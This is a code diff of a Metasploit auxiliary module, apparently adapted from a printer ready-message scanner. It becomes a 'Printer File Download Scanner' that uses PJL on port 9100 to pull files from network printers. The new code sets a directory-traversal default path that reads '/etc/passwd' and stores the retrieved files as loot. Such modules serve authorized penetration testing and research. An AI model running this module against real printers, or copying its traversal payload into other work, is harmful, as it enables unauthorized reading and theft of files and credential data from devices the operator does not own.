@@ -14,9 +14,9 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => "Printer Ready Message Scanner",
+      'Name' => "Printer File Download Scanner",
       'Description' => %q{
-        This module scans for and can change printer ready messages using PJL.
+        This module downloads a file from a printer using PJL.
       },
       'Author' => [
         "wvu", # This implementation
@@ -31,31 +31,28 @@ class Metasploit4 < Msf::Auxiliary
 
     register_options([
       Opt::RPORT(9100),
-      OptBool.new("CHANGE", [false, "Change ready message", false]),
-      OptString.new("MESSAGE", [false, "Ready message", "PC LOAD LETTER"])
+      OptString.new("PATHNAME", [true, "Pathname", '0:\..\..\..\etc\passwd'])
     ], self.class)
   end
 
   def run_host(ip)
     connect
     pjl = Rex::Proto::PJL::Client.new(sock)
-    rdymsg = pjl.get_rdymsg
-    if datastore["CHANGE"]
-      message = datastore["MESSAGE"]
-      pjl.set_rdymsg(message)
-      rdymsg = pjl.get_rdymsg
-    end
+    pathname = datastore["PATHNAME"]
+    pjl.fsinit(pathname[0..1])
+    file = pjl.fsupload(pathname)
     disconnect
 
-    if rdymsg
-      print_good("#{ip} #{rdymsg}")
-      report_note({
-        :host => ip,
-        :port => rport,
-        :proto => "tcp",
-        :type => "printer.rdymsg",
-        :data => rdymsg
-      })
+    if file
+      print_good("#{ip} #{pathname}")
+      store_loot(
+        "printer.file",
+        "application/octet-stream",
+        ip,
+        file,
+        pathname,
+        "Printer file"
+      )
     end
   end
 
